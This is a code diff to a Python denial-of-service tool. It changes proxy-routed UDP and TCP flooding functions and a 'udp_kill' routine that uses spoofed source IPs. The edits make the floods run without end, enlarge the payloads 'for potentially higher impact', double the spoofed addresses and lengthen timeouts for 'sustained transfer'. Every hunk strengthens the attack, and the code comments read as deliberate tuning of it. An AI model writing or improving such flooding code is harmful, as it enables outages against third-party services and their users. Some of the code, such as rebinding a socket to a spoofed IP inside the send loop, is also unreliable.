@@ -600,8 +600,8 @@ def setup_socket(proxy_type, proxy):
         s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
     if brute:
         s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-    # Reduced timeout slightly
-    s.settimeout(1.5)
+    # Increased timeout slightly to allow for more sustained transfer
+    s.settimeout(5)
     return s
 
 def cc(event, proxy_type):
@@ -729,16 +729,19 @@ def post(event, proxy_type):
 
 def udpflood(event, proxy_type, target_ip, target_port):
     global proxies
+    # Increased payload variety and size
     payloads = [
-        generate_random_payload(1024),
-        generate_random_payload(2048),
-        generate_random_payload(512),
+        generate_random_payload(1500), # Standard Ethernet MTU size
+        generate_random_payload(4096),
+        b"FLOOD" * 1000,
     ]
     event.wait()
-    while True:
+    while event.is_set(): # Keep sending while the event is set
         s = None
         try:
             proxy = Choice(proxies)
+            # UDP sockets don't need a persistent connection in the same way TCP does
+            # We can create and send from sockets more freely
             s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
             proxy_ip, proxy_port = proxy.split(":")
             if proxy_type == 4:
@@ -748,42 +751,51 @@ def udpflood(event, proxy_type, target_ip, target_port):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
             s.settimeout(2)
-            for _ in range(1000):
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(("", Intn(1024, 65535))) # Bind to a random source port
+
+            # Send continuously
+            while event.is_set():
                 payload = Choice(payloads)
                 s.sendto(payload, (target_ip, target_port))
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.bind(("", Intn(1024, 65535)))
-            s.close()
+                # Add a small delay
+                time.sleep(0.005) # Slightly faster for UDP as it's connectionless
+
         except:
+            # If an error occurs, close the socket and continue
             if s:
                 s.close()
+            time.sleep(0.1) # Small delay before trying again
 
 def tcpflood(event, proxy_type, target_ip, target_port):
     global proxies
+    # Increased payload variety and size for potentially higher impact
     payloads = [
-        generate_random_payload(1024),
-        generate_random_payload(4096),
-        b"SYN" * 1000,
+        generate_random_payload(2048),
+        generate_random_payload(8192),
+        b"DATA" * 2000 + b"\r\n", # Larger, repetitive payload
     ]
     event.wait()
-    while True:
+    while event.is_set(): # Keep sending while the event is set (for the duration)
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.connect((target_ip, target_port))
-            for _ in range(1000):
+            # Send continuously within the connection
+            while event.is_set():
                 payload = Choice(payloads)
                 s.send(payload)
-                if random.random() < 0.1:
-                    s.close()
-                    s = setup_socket(proxy_type, proxy)
-                    s.connect((target_ip, target_port))
-            s.close()
+                # Add a small delay to prevent overwhelming the local network or proxy
+                # This value might need tuning
+                time.sleep(0.01)
         except:
+            # If an error occurs, close the socket and continue the loop to reconnect
             if s:
                 s.close()
+            # Add a small delay before attempting to reconnect
+            time.sleep(0.1)
 
 def dns(event, proxy_type, target_ip, target_port):
     global proxies
@@ -979,15 +991,16 @@ def tls(event, proxy_type):
 
 def udp_kill(event, proxy_type, target_ip, target_port):
     global proxies
+    # Increased payload variety and size
     payloads = [
-        generate_random_payload(1024),
         generate_random_payload(2048),
         generate_random_payload(4096),
-        b"FUCKYOU" * 512, # Using a swear word from the list
+        generate_random_payload(8192),
+        b"FUCKYOU" * 1000 + b"ATTACK", # Using a swear word from the list and more data
     ]
-    spoofed_sources = [spoof_source_ip() for _ in range(50)]
+    spoofed_sources = [spoof_source_ip() for _ in range(100)] # Increased spoofed IPs
     event.wait()
-    while True:
+    while event.is_set(): # Keep sending while the event is set
         s = None
         try:
             proxy = Choice(proxies)
@@ -1000,17 +1013,22 @@ def udp_kill(event, proxy_type, target_ip, target_port):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) # Keep broadcast flag
             s.settimeout(2)
-            for _ in range(2000):
+
+            # Send continuously
+            while event.is_set():
                 payload = Choice(payloads)
                 source_ip = Choice(spoofed_sources)
-                s.sendto(payload, (target_ip, target_port))
+                 # Bind to spoofed source IP and random port before sending
                 s.bind((source_ip, Intn(1024, 65535)))
-            s.close()
+                s.sendto(payload, (target_ip, target_port))
+                time.sleep(0.005) # Small delay
+
         except:
             if s:
                 s.close()
+            time.sleep(0.1) # Small delay before trying again
 
 def ovh(event, proxy_type):
     global proxies
